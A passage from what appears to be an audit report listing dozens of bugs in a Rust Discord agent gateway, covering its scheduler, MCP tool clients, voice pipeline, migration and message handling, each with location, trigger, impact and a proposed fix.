- Fix: Chunk the formatted tools and endpoints text using `chunk_slash_reply` or truncate to 2,000 characters before sending.

### `LiveEditThrottler` holds mutex lock across network I/O and issues redundant `start_typing` on final update
- Location: src/discord/throttler.rs:200
- What: The throttler serializes network operations and starts typing even for a final update.
- Trigger: A final edit follows a typing stop, or slow Discord I/O overlaps another update on the same throttler.
- Impact: Typing can persist after completion and same-stream updates stall; per-stream serialization alone is not a deadlock.
- Fix: Do not start typing on a final update; keep necessary per-stream serialization, isolating slow operations only if concurrent update ordering is preserved.

### Migration failures leave earlier phases applied
- Location: src/migrate/mod.rs:85
- What: Configuration import precedes database setup and process retirement without phase-wide compensation.
- Trigger: Database initialization fails after config import, or a later shutdown/cutover operation fails.
- Impact: The operator receives failure with some configuration/service state already changed; cutover receipts/backups mitigate but do not undo all earlier phases.
- Fix: Preflight non-mutating checks and record completed phases with explicit recovery/compensation instructions; preserve receipt-based ownership safety.

### Biased command polling can starve backend completion
- Location: src/multiplexer/actor.rs:300
- What: Commands always win the biased select when both mailbox and backend are ready.
- Trigger: Sustained traffic to one session keeps its mailbox continuously ready.
- Impact: Backend progress/completion is postponed and pending-queue overflow increases.
- Fix: Remove unconditional bias or enforce a finite command batch before polling the backend.

### Cancelled GC can strand a session in retirement
- Location: src/multiplexer/gc.rs:61
- What: The retirement protocol lacks cancellation ownership after setting `accepting=false`.
- Trigger: A caller drops collection after eviction is enqueued, then the busy actor replies false with no collector left to resume it.
- Impact: Later routes wait indefinitely and later collectors skip the retired handle.
- Fix: Give the retirement transaction an owned task that completes eviction/reply handling; restore acceptance only when pre-enqueue cancellation is certain.

### Failure handling clears dirty state despite surviving mutations
- Location: src/multiplexer/actor.rs:447
- What: Error paths unconditionally clear the dirty flag after retaining state changes.
- Trigger: A failed runner leaves a binding mutation, or inbound persistence fails after an earlier unsuccessful state flush.
- Impact: GC/shutdown can skip persistence of retained dirty state.
- Fix: Preserve the prior dirty obligation and mark surviving mutations dirty; roll back only genuinely discarded turn-local state.

### Approval timeout arithmetic lacks an upper-bound check
- Location: src/main.rs:610
- What: Adding five seconds to an accepted u64 timeout can overflow.
- Trigger: A privileged operator sets `APPROVAL_TIMEOUT_SECS=18446744073709551615`; no routine-input crash is established.
- Impact: Checked builds panic and unchecked arithmetic wraps, making pathological configuration build-dependent.
- Fix: Reject unsupported upper values at configuration parsing and use checked addition.

### Drain scanning blocks async workers on filesystem I/O
- Location: src/drain_control.rs:250
- What: The async watcher invokes synchronous marker existence and read operations.
- Trigger: The workspace resides on a stalled or slow mount during a scan.
- Impact: A Tokio worker blocks and delays unrelated work; async cancellation cannot interrupt the synchronous operation.
- Fix: Use asynchronous reads or bounded blocking execution, and do not require a stalled probe to finish before shutdown proceeds.

### Failed marker publication leaks temporary files
- Location: src/drain_control.rs:182
- What: Write/rename failure leaves a UUID-named marker temporary file without cleanup.
- Trigger: A directory occupies the final marker path and an operator/controller retries publication.
- Impact: Failed retries accumulate files in the state directory; no realistic disk-exhaustion rate was established for P0.
- Fix: Use a temporary-file cleanup guard that removes the temporary file on both write and rename errors.

### Mirror lookup materializes all historical candidates
- Location: src/mirror.rs:93
- What: Origin lookup fetches all matching sessions before filtering bot/user identity in memory.
- Trigger: A long-lived origin accumulates many sessions and receives repeated mirror deliveries.
- Impact: Per-delivery memory and query/processing cost grow with retained history; realistic OOM was not demonstrated.
- Fix: Push exact constraints into SQL and fetch a bounded candidate set sufficient for selection and ambiguity detection.

### Readiness timeout is hidden by a liveness fallback
- Location: src/readiness.rs:261
- What: A readiness transport error falls back to `/health` and may become a healthy result.
- Trigger: `/readyz` times out under overload while `/health` remains responsive.
- Impact: Dependency unavailability is misreported as readiness.
- Fix: Fall back only for explicit unsupported readiness endpoints such as HTTP 404; preserve timeout failures.

### Directory traversal and results lack aggregate budgets
- Location: src/tools/file.rs:208
- What: Listing collects all entries and search bounds match count but not visited paths or total result bytes.
- Trigger: A large workspace directory is listed or searched for an absent/common term; matching lines can each approach one MiB.
- Impact: Large-tree workloads cause excessive memory, result size, and unbounded traversal time.
- Fix: Add entry, visited-path, frontier, result-byte, and cancellation budgets with explicit truncation metadata.

### MCP JSON body consumption is outside the timeout
- Location: src/tools/mcp.rs:199
- What: Only sending the HTTP request is wrapped in the configured timeout on the JSON response path.
- Trigger: A server sends successful JSON headers then stalls the body.
- Impact: The call never honors its advertised complete-request deadline.
- Fix: Apply a single deadline across send and bounded body decoding.

### MCP cleanup can wait forever or detach drains
- Location: src/tools/mcp.rs:163
- What: After killing only the immediate child, cleanup awaits stderr EOF without a deadline.
- Trigger: A server descendant retains stderr after the response, or the read timeout returns before cleanup.
- Impact: The client mutex stays occupied indefinitely or detached drain work survives cancellation.
- Fix: Own and terminate the process tree and bound, abort, and join pipe tasks on every exit path.

### MCP stdin writes precede draining and deadlines
- Location: src/tools/mcp.rs:133
- What: The request is written and stdin shut down before output draining and the read timeout begin.
- Trigger: A configured server fills stdout/stderr before reading a request larger than the stdin pipe capacity, or stops reading stdin.
- Impact: The client call and its serialized followers hang; this is a dependency/pipe condition, not a demonstrated process-wide deadlock.
- Fix: Start pipe drains immediately and apply one end-to-end deadline to lock acquisition, concurrent writing/reading, and cleanup.

### Special files can block file-tool workers indefinitely
- Location: src/tools/file.rs:329
- What: Search and pre-write validation do not require a regular file before I/O.
- Trigger: A workspace FIFO with no peer is searched or written.
- Impact: That operation can hang; repeated calls can occupy blocking workers, not necessarily deadlock the entire process.
- Fix: Require regular opened handles and no-follow/nonblocking opening before performing bounded I/O.

### Synchronous path validation blocks async workers
- Location: src/tools/file.rs:71
- What: Metadata and canonicalization calls execute synchronously on async request paths.
- Trigger: A workspace is on slow or stalled network/FUSE storage during validation.
- Impact: Runtime workers stall and unrelated request latency increases.
- Fix: Move coherent validation/open operations to the blocking pool or appropriate async filesystem APIs.

### Audio callback waits indefinitely under channel backpressure
- Location: src/voice/mod.rs:70
- What: Event handling awaits a bounded channel send without a backpressure policy.
- Trigger: The downstream consumer stops draining while the frame channel is full.
- Impact: The callback cannot return; the lane's stronger claim of a gateway-wide central event-loop stall is not established by repository source.
- Fix: Use nonblocking admission with an explicit overflow/drop metric, keeping event callbacks bounded.

### STT requests have no explicit timeout
- Location: src/voice/pipeline.rs:141
- What: The STT client uses default request timeout behavior without a configured bound.
- Trigger: OpenAI or a configured proxy stalls without closing the connection.
- Impact: The transcription caller can remain blocked indefinitely.
- Fix: Configure explicit connection and request/read timeouts suitable for transcription.

### Approval denial count does not enforce a per-turn limit
- Location: src/agent/omo_backend.rs:870
- What: Disabled-terminal denials bypass counting and item lifecycle events reset the count.
- Trigger: A peer repeatedly requests a disabled terminal, or interleaves other denied requests with item-start/completion events.
- Impact: The intended loop limit never trips and the turn consumes its remaining total budget.
- Fix: Count every policy denial cumulatively and reset only for a genuinely new turn.

### Completed message items erase earlier same-turn content
- Location: src/agent/omo_backend.rs:963
- What: An item completion replaces the entire turn-wide text rather than that item's text.
- Trigger: One daemon turn emits distinct agent-message items A and B and completes B after A.
- Impact: Final output and transcript omit A; upstream multi-item emission frequency was not established as routine production input.
- Fix: Track ordered text by item ID and replace only the completed item's snapshot, including during deadline drain.

### Cooperative cancellation hides remote interrupt failure
- Location: src/agent/backend.rs:47
- What: The default cancellation wrapper discards the backend cancellation Result.
- Trigger: Cancellation occurs while start is unacknowledged or interrupt is rejected, disconnected, or times out.
- Impact: Callers receive only local cancellation without knowing the remote turn remains unresolved.
- Fix: Preserve cancellation cleanup errors in the returned context and distinguish local cancellation from confirmed remote interruption.

### Daemon shutdown does not own descendant processes
- Location: src/agent/omo_daemon.rs:397
- What: Managed cleanup targets only the direct Child without an owned process group/tree.
- Trigger: The configured daemon wrapper forks a server or leaves long-lived tool subprocesses before shutdown.
- Impact: Descendants can survive outside supervisor ownership; kill-on-drop covers only the direct child.
- Fix: Start managed daemons in an owned process group/job and terminate/reap that group during cleanup.

### Failed daemon log setup silently discards both output streams
- Location: src/agent/omo_daemon.rs:195
- What: Log creation/open/clone failures fall through to null stdout/stderr without reporting the cause.
- Trigger: HOME is unwritable, disk is full, or file descriptors are exhausted.
- Impact: Repeated daemon startup failures lose their diagnostics and surface only as readiness errors.
- Fix: Report log setup failure and fall back to an observable sink such as inherited stderr.

### Fixed reconnect cadence synchronizes outage load
- Location: src/agent/omo_backend.rs:89
- What: Concurrent turns retry failing connections every 500 ms without jitter or a shared gate.
- Trigger: A burst of turns overlaps a daemon outage or recovery.
- Impact: Synchronized retry traffic adds load to the recovering dependency and retries permanent handshake failures too.
- Fix: Apply capped exponential backoff with jitter, classify permanent failures, and share endpoint reconnect admission.

### Interim streaming bypasses final suppression and filtering
- Location: src/agent/omo_backend.rs:978
- What: Raw cumulative deltas are dispatched before direct-emission suppression or reasoning/silence filtering is applied.
- Trigger: A cron turn sets `cron_suppress_direct_emission=true`, or streamed text contains a prefix removed only at finalization.
- Impact: The backend emits stream actions contrary to final policy; downstream visibility and an authorization boundary breach are not established here.
- Fix: Gate every emission on suppression and buffer/filter undecidable prefixes before dispatch.

### Ping or pong ends interrupt cleanup prematurely
- Location: src/agent/omo_backend.rs:588
- What: The cleanup while-let terminates on any non-Text WebSocket frame.
- Trigger: Ping/pong arrives before the matching interrupt response or terminal during deadline cleanup.
- Impact: A live connection's remaining cleanup budget is abandoned and remote ownership stays unresolved.
- Fix: Match frame kinds inside the loop, continuing control frames and ending only for correlated completion, close/error, or deadline.

### Portless WebSocket URLs cannot pass local readiness
- Location: src/agent/omo_daemon.rs:51
- What: Raw TCP connection uses the URL authority without adding WebSocket's default port.
- Trigger: Local configuration is `ws://localhost` or `ws://127.0.0.1/path` with a service on port 80.
- Impact: Readiness fails despite a URL the WebSocket client can interpret, causing unsuccessful spawn attempts.
- Fix: Parse the URL once and use its host and explicit/default port consistently across probing and spawning.

### Readiness requires EOF and accepts malformed status prefixes
- Location: src/agent/omo_daemon.rs:56
- What: HTTP status is prefix-matched only after the full connection has closed.
- Trigger: A complete 200 response leaves the connection open beyond the probe budget, or the peer sends `HTTP/1.1 2000`.
- Impact: A ready daemon is rejected or a malformed response is accepted, distorting spawn/restart decisions.
- Fix: Parse an exact three-digit status from bounded headers without waiting for body EOF.

### Setup treats reverse requests as responses when IDs collide
- Location: src/agent/omo_backend.rs:167
- What: Initialize/resume setup accepts matching numeric IDs without requiring a response envelope.
- Trigger: A server-to-client request uses ID 1 or 2 while the corresponding client setup request is outstanding.
- Impact: Setup advances or persists a binding without receiving a valid response.
- Fix: Require no method, the expected ID, exactly one result/error member, and a valid method-specific result shape.

### Mid-stream SSE error objects are reported as successful completion
- Location: src/agent/llm.rs:250
- What: The SSE parser ignores provider error objects and EOF still produces an Ok final chunk.
- Trigger: A provider emits an OpenAI error object or Anthropic error event after streaming has begun.
- Impact: An aborted generation appears successful with missing or partial output.
- Fix: Parse typed error events and forward an error to both stream and tool-call result consumers.

### Numeric non-version URL suffixes select the wrong endpoint
- Location: src/agent/llm.rs:94
- What: The endpoint helper treats any all-digit last segment as a version prefix.
- Trigger: An OpenAI-compatible proxy uses a base such as `http://proxy/models/42` and expects the normal `/v1/chat/completions` suffix.
- Impact: The client appends only `/chat/completions` and requests the wrong endpoint.
- Fix: Require an actual supported version prefix before recognizing a version segment, and trim configured base URL whitespace.

### A stopped scheduler cannot be started again
- Location: src/cron/scheduler.rs:675
- What: Scheduler restart retains the previously signalled shutdown value.
- Trigger: The same scheduler instance follows start, shutdown, then start.
- Impact: The replacement polling loop exits immediately and no jobs run.
- Fix: Reset or replace the shutdown channel under the scheduler lifecycle lock before spawning a new polling task, with a defined start-versus-shutdown ordering.

### Cancelling wait_idle permanently detaches tracked executions
- Location: src/cron/scheduler.rs:565
- What: wait_idle transfers tracked handles into a cancellable caller future.
- Trigger: That waiting future is cancelled while executions are still active.
- Impact: Tasks detach, active counts underreport them, and concurrent shutdown cannot join them.
- Fix: Keep execution ownership in shared state until completion; implement waiting as an observation of tracked completion rather than transferring every handle into a cancellable caller future.

### Cutover receipt checking races with claim insertion
- Location: src/cron/scheduler.rs:1012
- What: The pending-cutover receipt check is separate from claim insertion.
- Trigger: A receipt is created after the guard query but before a still-eligible job's INSERT SELECT.
- Impact: The scheduler can start a run inside the intended cutover exclusion window.
- Fix: Check pending receipt absence as part of the same atomic claim operation or serialize receipt creation and claiming under the same database write transaction.

### Delivery obligation IDs collide within a millisecond
- Location: src/cron/scheduler.rs:1696
- What: Delivery obligation identity contains only job ID and a wall-clock millisecond.
- Trigger: Two deliveries for one job share a millisecond, or the clock repeats a value.
- Impact: Distinct attempts or destinations share a ledger identity and cannot be accounted for independently.
- Fix: Give each delivery obligation a collision-resistant ID, preferably derived from run ID plus destination identity when retry idempotency is required; do not use wall time as uniqueness.

### Incident read/write failures silently defeat acknowledgement handling
- Location: src/cron/scheduler.rs:1603
- What: Incident reads and writes convert database failures into ordinary acknowledgement state.
- Trigger: Incident SELECT, INSERT, UPDATE, or DELETE fails during notification handling.
- Impact: Alerts can ignore acknowledgement or later be suppressed by stale acknowledgement state.
- Fix: Handle and log incident persistence/read errors explicitly, preserving a deliberate acknowledgement policy when state is unavailable rather than silently treating database errors as normal state.

### Large valid intervals panic when added to the current date
- Location: src/cron/scheduler.rs:1927
- What: A representable interval duration can overflow the resulting DateTime on addition.
- Trigger: An operator registers interval:10000000000000s.
- Impact: Registration panics on exceptional configuration rather than returning an error; routine-input process failure is not established.
- Fix: Use checked_add_signed and turn an out-of-range result into OmonError::Config; apply the same checked-boundary policy to clock-derived lease additions.

### Manual completion exhausts repeat limits without disabling the job
- Location: src/cron/scheduler.rs:1245
- What: Manual completion consumes repeat accounting without disabling an exhausted schedule.
- Trigger: A repeat.times=1 job is manually triggered before its scheduled occurrence.
- Impact: It stays enabled and due but subsequent claims never execute it.
- Fix: Either keep manual runs outside the scheduled repeat budget, or atomically disable/clear next_run_at when manual completion reaches that budget. Make the behavior consistent with the manual-run contract.

### Pausing an executing recurring job discards its completion accounting
- Location: src/cron/scheduler.rs:1282
- What: Recurring completion's enabled predicate discards accounting after a concurrent pause.
- Trigger: An operator pauses a recurring job during its execution, then resumes it after completion.
- Impact: The finished run is not counted and repeat-limited jobs can execute extra times.
- Fix: Persist completion accounting independently of whether scheduling is enabled; condition only next_run_at advancement on enabled, and retain revision checks to avoid overwriting an edited payload.

### Predecessor fallback crosses profile boundaries and treats IDs as LIKE patterns
- Location: src/cron/scheduler.rs:147
- What: Predecessor fallback ignores profile isolation and interprets job-ID wildcards in LIKE.
- Trigger: The requested profile has no nonempty exact output and another profile has a newer assistant session ending with that ID.
- Impact: The agent consumes the wrong profile's context; attacker control over isolated profiles is not demonstrated.
- Fix: Restrict fallback to explicitly enumerated exact session keys for the requested profile/job. If any LIKE matching remains necessary, escape wildcard characters and preserve the profile boundary.

### Successful-run output persistence errors are silently discarded
- Location: src/cron/scheduler.rs:1310
- What: Successful-run output insertion discards its database result.
- Trigger: The cron_outputs statement fails while the surrounding completion transaction can still commit.
- Impact: Success can be recorded without its predecessor output or an explicit output-persistence error.
- Fix: Propagate the insertion error or record an explicit output-persistence failure with a defined recovery path; do not silently commit an incomplete successful-run record.

### User-provided repeat counts overflow on completion
- Location: src/cron/scheduler.rs:267
- What: Repeat completion increments an externally supplied u64 without an overflow check.
- Trigger: A stored or registered payload sets repeat.completed to 18446744073709551615 without a positive limit.
- Impact: Completion panics in checked builds or wraps accounting; this is an exceptional imported/configured value.
- Fix: Reject an unincrementable count at registration and use checked_add in completion so persisted or imported payloads cannot bypass the boundary validation.

### Ack command executed without working directory or augmented environment PATH
- Location: src/cron/ack.rs:31
- What: Ack execution inherits the daemon directory and PATH rather than the job's execution context.
- Trigger: An ack uses ./scripts/checkpoint.sh or a binary present only in an augmented job PATH.
- Impact: A previously delivered run's acknowledgement fails or targets the wrong working tree.
- Fix: Pass the resolved job working directory and execution PATH to ack execution rather than relying on daemon inheritance.

### Monitor output discarded and omitted from agent prompt
- Location: src/cron/executor.rs:252
- What: Changed monitor content is hashed but never appended to the agent prompt.
- Trigger: A monitor_script or monitor_url changes and the task relies on that returned content to explain the change.
- Impact: The agent is invoked without the observed state it needs to report.
- Fix: Append `monitor_output` under a `\n\n[Monitor output]\n` section in `prompt` alongside `script_output`.

### Non-transactional store synchronization risks inconsistent state and scheduler races
- Location: src/cron/store.rs:974
- What: Store synchronization commits each row mutation independently.
- Trigger: A database failure interrupts a multi-job import after earlier upserts succeeded.
- Impact: The database remains partially synchronized; scheduler observation of partial state is conditional on concurrent claim activity.
- Fix: Wrap the entire synchronization loop per store inside a single database transaction (`let mut tx = self.pool.begin().await?`) and commit only upon full success.

### Reachable panic on large retention days in `prune_terminal_cron_runs`
- Location: src/cron/store.rs:127
- What: Retention cutoff construction accepts values beyond chrono's representable range.
- Trigger: An operator sets CRON_RUNS_RETENTION_DAYS to 999999999999.
- Impact: Startup pruning can panic instead of reporting invalid configuration.
- Fix: Use `chrono::TimeDelta::try_days(retention_days).ok_or_else(...)` and clamp or return a configuration error.

### `failure_deliver = []` inverts user intent by falling back to origin delivery
- Location: src/cron/store.rs:478
- What: An explicitly empty failure destination list falls through to origin delivery.
- Trigger: A job specifies failure_deliver: [] and later fails.
- Impact: It sends a failure notification despite the empty destination override.
- Fix: Check `if let Some(list) = &self.failure_deliver { if list.is_empty() { return Ok(Vec::new()); } }`.

### Race condition in create_cron_job allows initially paused jobs to trigger execution
- Location: src/dashboard.rs:1449
- What: Creating a paused cron job registers it enabled before a separate pause operation.
- Trigger: An immediately due job with enabled:false is claimed between registration and pause.
- Impact: Work executes even though creation requested a paused state.
- Fix: Pass the initial `enabled` state into the scheduler registration methods and insert the record with `enabled = 0` when `input.enabled == Some(false)`.

### Approval expiry removes its retry target before the HTTP edit succeeds
- Location: src/discord/adapter.rs:3198
- What: Approval expiry removes its tracked target before the remote edit succeeds.
- Trigger: Discord rejects or times out the expiry edit after the tuple is removed.
- Impact: Retry has no target and stale approval buttons remain visible.
- Fix: Keep the target until cleanup succeeds, or retain a bounded retry record; use idempotent lookup-and-edit followed by conditional removal.

### Approval mentions are appended outside the 2000-character budget
- Location: src/discord/adapter.rs:3292
- What: Approval mentions are prepended after the command consumes the message budget.
- Trigger: A near-2000-character approval body receives at least one ordinary 18-digit user mention.
- Impact: Discord rejects the approval prompt and its buttons never arrive.
- Fix: Reserve space for the mention prefix before truncating the command, and bound/deduplicate the mention list itself.

### Auto-thread creation races between explicitly mentioned bots
- Location: src/discord/adapter.rs:987
- What: Independent bot handlers create the same starter thread before deduplicating their invocations.
- Trigger: One guild message explicitly mentions two configured bots with auto-thread creation enabled.
- Impact: The losing create request aborts one bot invocation rather than joining the existing thread.
- Fix: Resolve/reuse an existing starter thread and coordinate creation by starter message ID; claim/deduplicate the invocation before non-idempotent side effects.

### Backfilled mentions bypass live auto-thread routing
- Location: src/discord/adapter.rs:3728
- What: Backfill dispatches without the live path's auto-thread target resolution.
- Trigger: auto_thread is enabled and a mention arrives while the gateway is offline.
- Impact: The recovered invocation replies in the parent rather than its intended starter thread.
- Fix: Share an idempotent target-resolution step between live and backfill routing, including existing starter-thread reuse, before choosing how to await the turn.

### Dead-target persistence can run in the opposite order to in-memory mutations
- Location: src/discord/adapter.rs:2159
- What: Dead-target mutations spawn unordered persistence operations and discard database results.
- Trigger: mark_dead is followed by clear but the spawned DELETE commits before the older INSERT, or either write fails.
- Impact: Restart can resurrect stale dead-target state without reporting the persistence failure.
- Fix: Serialize persistence per bot/channel or use generation-checked writes, propagate/log failures, and avoid unnecessary clears when no durable entry needs removal.

### Dead-target short circuit prevents typing shutdown
- Location: src/discord/adapter.rs:3060
- What: The dead-target return precedes local typing-stop cleanup.
- Trigger: Typing starts, a later operation marks the target dead, and terminal cleanup sends Typing(false).
- Impact: The typing guard remains alive and can continue failed refresh requests.
- Fix: Always remove local typing state for active=false before checking target health or HTTP availability.

### EditMessage does not handle Discord's content limit
- Location: src/discord/adapter.rs:2945
- What: EditMessage sends content without an explicit overflow policy.
- Trigger: An edit contains 2001 ASCII characters.
- Impact: Discord rejects the edit instead of delivering a bounded update.
- Fix: Apply an explicit edit overflow policy: edit the first bounded chunk and send continuations, or reject oversized edits at the boundary with a clear error before transport.

### Forum child-send errors mark the forum parent dead
- Location: src/discord/adapter.rs:2799
- What: A failed forum continuation marks the forum parent rather than the failing post dead.
- Trigger: The new forum child is deleted or becomes inaccessible between continuation chunks.
- Impact: Future independent posts to the healthy forum are suppressed.
- Fix: Record the actual failing post_channel.id for continuation failures; leave the parent healthy unless a parent operation fails.

### Forum upload titles exceed Discord's name limit
- Location: src/discord/adapter.rs:1812
- What: Forum upload titles concatenate an unbounded filename with a prefix.
- Trigger: A valid filename plus Voice Note or file prefix exceeds Discord's 100-character thread-name limit.
- Impact: An otherwise valid upload is rejected.
- Fix: Apply a shared Discord thread-name limiter to the prefixed filename before CreateForumPost.

### Legacy cursor updates are a non-atomic check then write
- Location: src/discord/adapter.rs:3347
- What: Legacy cursor advancement checks and overwrites in separate statements.
- Trigger: Handlers for snowflakes 200 and 300 both read 100, then 300 commits before 200.
- Impact: The supposedly monotonic cursor regresses.
- Fix: Enforce the numeric snowflake comparison in the atomic UPSERT update predicate, rather than relying on a preceding SELECT.

### One previously claimed constituent discards fresh messages in the same batch
- Location: src/discord/adapter.rs:646
- What: An overlapping durable constituent claim causes the entire coalesced batch to be rejected.
- Trigger: A replayed or concurrently backfilled message A shares a debounce batch with fresh message B.
- Impact: B is discarded even though B was never delivered.
- Fix: Atomically claim/filter individual constituent deliveries before combining their content, and coalesce only the newly claimed events; do not treat an overlapping batch as wholly duplicate.

### Operation-specific permission errors poison the whole channel
- Location: src/discord/adapter.rs:2338
- What: Operation-specific 403 errors are treated as permanent whole-channel failures.
- Trigger: The bot can send but lacks permission to edit or delete the particular target message.
- Impact: An unrelated permission failure disables subsequent channel delivery.
- Fix: Classify whole-target failure using operation context and Discord error codes; do not infer send unavailability from edit/delete permissions.

### Placeholder HTTP send holds the global stream-map mutex
- Location: src/discord/adapter.rs:2638
- What: Placeholder creation awaits network I/O while holding the global stream-map mutex.
- Trigger: One placeholder send is slow or Discord rate-limits it while other streams need the map.
- Impact: All bots and channels sharing the map suffer head-of-line blocking, not a proven permanent process deadlock.
- Fix: Reserve per-stream initialization state under the map lock, release the global lock, then perform network I/O behind a per-stream initialization guard.

### REST guild history is misclassified as direct messages
- Location: src/discord/adapter.rs:1388
- What: Absent message.guild_id overrides authoritative guild channel type during history conversion.
- Trigger: REST history omits guild_id for a fetched guild message while channel metadata identifies a guild channel.
- Impact: An otherwise admitted guild user receives DM-style session and implicit-response routing; arbitrary user authorization bypass is not established.
- Fix: Populate the fetched message's guild_id from the authoritative channel metadata before conversion, and determine DM status from the resolved channel kind rather than allowing absent optional message metadata to override it.

### Reactions to thread followups target the parent channel
- Location: src/discord/adapter.rs:3085
- What: Reaction dispatch selects the session parent channel rather than the original thread message channel.
- Trigger: A normal followup is posted inside a thread whose session stores its parent in channel_id.
- Impact: Reactions fail with Unknown Message and a start reaction may not be cleared.
- Fix: Carry the original message channel with reaction actions; use the thread for genuine thread messages and the parent only for the auto-thread starter.

### Required thread mentions are bypassed by a free-response parent
- Location: src/discord/adapter.rs:1455
- What: A free-response parent independently bypasses the configured thread mention requirement.
- Trigger: thread_require_mention is enabled and an authorized user posts an unmentioned followup under a free-response parent.
- Impact: The bot responds despite the thread mention policy.
- Fix: Enforce the thread mention requirement before evaluating implicit free-channel admission, or exclude threads from that bypass when the option is set.

### Routing can reorder adjacent debounce batches
- Location: src/discord/adapter.rs:617
- What: Detached debounce batches can reach routing out of arrival order.
- Trigger: Batch A waits for attachment hydration while a later batch B for the same session finishes hydration first.
- Impact: The conversation receives B before A.
- Fix: Route each session through a single ingress worker that owns hydration and dispatch ordering; do not let independent timer tasks race to enqueue turns.

### Send and edit dispatch discard the reasoning-filtered output
- Location: src/discord/adapter.rs:2734
- What: SendMessage and EditMessage render original content after computing a reasoning-filtered version.
- Trigger: An outbound send or edit contains <think>private details</think>Public answer, or a MEDIA directive inside that block.
- Impact: Supposedly hidden content is published and hidden media directives can execute on sends.
- Fix: Use filtered_content throughout both SendMessage and EditMessage rendering, including footer/title generation and MEDIA extraction.

### Stop can miss an already detached debounce batch
- Location: src/discord/adapter.rs:1032
- What: Stop only cancels debounce batches still present in the shared map.
- Trigger: A timer detaches a batch and waits for ledger or attachment I/O before /stop executes.
- Impact: The detached old batch can start a new turn after stop returns.
- Fix: Associate a cancellation generation/token with each session and check it immediately before dispatch, or serialize stop and pending ingress work in the same session worker.

### Table-upload failure is converted into success on final-chunk retry
- Location: src/discord/adapter.rs:2667
- What: The sequence marker is committed before final table attachments finish sending.
- Trigger: Text succeeds, a final table upload fails, and the caller retries that same stream sequence.
- Impact: The retry reports success without delivering the missing table or completing cleanup.
- Fix: Record successful final completion only after all required deliveries finish. Track completed text and pending attachments separately so retrying attachments does not duplicate already delivered text.

### Text stop detection occurs after context decoration and auto-thread creation
- Location: src/discord/adapter.rs:1031
- What: Text stop detection occurs after content decoration and auto-thread side effects.
- Trigger: A user replies with /stop, enables topic/history decoration, or explicitly mentions the bot with /stop in an auto-thread channel.
- Impact: The command becomes a model turn or targets the newly created thread instead of stopping the intended session.
- Fix: Detect the normalized raw command body before reply/topic/history decoration or auto-thread side effects, then stop the existing target session directly.

### Pairing expiry is evaluated against stale request-start time
- Location: src/discord/pairing.rs:462
- What: Pairing validates expiry using the pre-queue request time and accepts equality.
- Trigger: A code is submitted just before expiration and waits on the pool until after its deadline.
- Impact: An expired code can be consumed, with inconsistent behavior at the exact cleanup boundary.
- Fix: Reject now >= expires_at and sample the production clock at the claim/check boundary after waiting for the connection. Make the consuming DELETE conditional on the same expiry check; preserve deterministic injected-clock support for tests without reusing a pre-queue production timestamp.

### Remembered session approvals grow without eviction
- Location: src/discord/approval.rs:468
- What: Remembered session grants have no automatic lifetime or size bound.
- Trigger: Long-lived use accumulates distinct approved commands and sessions without clear_session.
- Impact: The resident cache grows; neither ordinary approval volume nor an exhaustion horizon was demonstrated for P0.
- Fix: Bound the remembered session cache by entry count/bytes and expire it with the session lifecycle. Evicting a remembered grant is safe because the next matching operation can prompt again; use a digest for exact command/reason identity rather than retaining entire raw strings.

### Discord thread name length validation missing in `/title` and `/thread` commands
- Location: src/discord/commands.rs:1126
- What: Thread creation and title edits omit local validation of Discord's name bounds.
- Trigger: A user submits whitespace-only text or more than 100 characters.
- Impact: Discord rejects the operation rather than receiving a valid name or the user receiving a clear validation response.
- Fix: Validate that trimmed thread names are between 1 and 100 characters before calling `EditThread` or `CreateThread`. If invalid, return an informative ephemeral error message.

### Unrecognized `mode` argument in `/yolo` unexpectedly toggles YOLO mode instead of returning validation error
- Location: src/discord/commands.rs:1265
- What: An unrecognized yolo mode takes the toggle branch instead of rejecting the value.
- Trigger: An authorized operator enters /yolo mode:check or another invalid mode expecting no state change.
- Impact: Approval-bypass mode flips unintentionally; this is not an unprivileged authorization exploit.
- Fix: Match `None => !effective`, and return an error for unrecognized `Some(unknown)` strings: "Invalid mode. Use 'on' or 'off'".

### `/skills action:search` response is sent without chunking and exceeds Discord 2,000-character limit
- Location: src/discord/commands.rs:558
- What: Skill search sends the complete result list as one Discord message.
- Trigger: A search matches enough long skill names or descriptions to exceed 2000 characters.
- Impact: The slash-command response is rejected.
- Fix: Wrap the output of `search` in `chunk_slash_reply` and iterate over chunks with `ctx.say`, identical to the `list` handler.

### `/steer` embeds untruncated user guidance into ephemeral reply exceeding Discord 2,000-character limit
- Location: src/discord/commands.rs:961
- What: Steering confirmation echoes the full guidance without reserving a content budget.
- Trigger: The slash option accepts guidance long enough that the prefixed confirmation exceeds 2000 characters.
- Impact: The confirmation fails even though guidance was queued.
- Fix: Use `preview_text(&text, 100)` (which is already implemented and used in `undo` and `retry`) to truncate the echoed text in the confirmation message.

### `/undo` and `/retry` mutate session messages without stopping active turns in multiplexer
- Location: src/discord/commands.rs:974
- What: Undo and retry mutate persistent history without coordinating with an active session turn.
- Trigger: A user runs /undo or /retry while the actor is still generating and persisting a response.
- Impact: A late actor write can reintroduce stale response history after deletion.
- Fix: Serialize undo/retry with the session actor and wait for active-turn termination before deleting or replaying history.

### `decode_wav_pcm` parses audio data as 16-bit PCM without validating format tag or bit depth
- Location: src/discord/attachments.rs:35
- What: WAV decoding interprets all sample data as 16-bit PCM without checking format or bit depth.
- Trigger: An admitted WAV uses 8-bit, 24-bit, float, or compressed sample encoding.
- Impact: The transcriber receives misdecoded audio rather than a supported decode or explicit rejection.
- Fix: Validate the WAV format tag and bit depth; decode supported PCM or reject unsupported WAV explicitly rather than treating it as Opus.

### `is_voice_attachment` fallback omits `.wav` extension when Content-Type is missing
- Location: src/discord/attachments.rs:90
- What: Voice classification omits the wav extension in its MIME-less fallback.
- Trigger: A file named recording.wav has no Content-Type, waveform flag, or voice-message filename marker.
- Impact: The WAV is not recognized for voice transcription.
- Fix: Add `|| lower.ends_with(".wav")` to the filename extension fallback check.

### `scan_fences` in `throttler.rs` mishandles 4+ backtick fences and fails to track tilde (`~~~`) code blocks
- Location: src/discord/throttler.rs:431
- What: Markdown fence tracking only recognizes a three-backtick prefix.
- Trigger: A split response contains a tilde fence or a longer backtick fence.
- Impact: Chunk formatting may not preserve the original fence form.
- Fix: Count fence markers and match opening/closing fence lengths dynamically, supporting both `` ` `` and `~`.

### Config import merges values from nonselected profiles
- Location: src/migrate/config_import.rs:460
- What: Profile scalar fallback filters Discord enablement but not the selected profile set.
- Trigger: A nonselected archive/staging profile defines APPROVAL_MODE while the root lacks that scalar.
- Impact: Migration can import unintended policy settings and tokens from inactive profiles.
- Fix: Filter profiles by the same selected-profile policy before mapping tokens and scalar values.

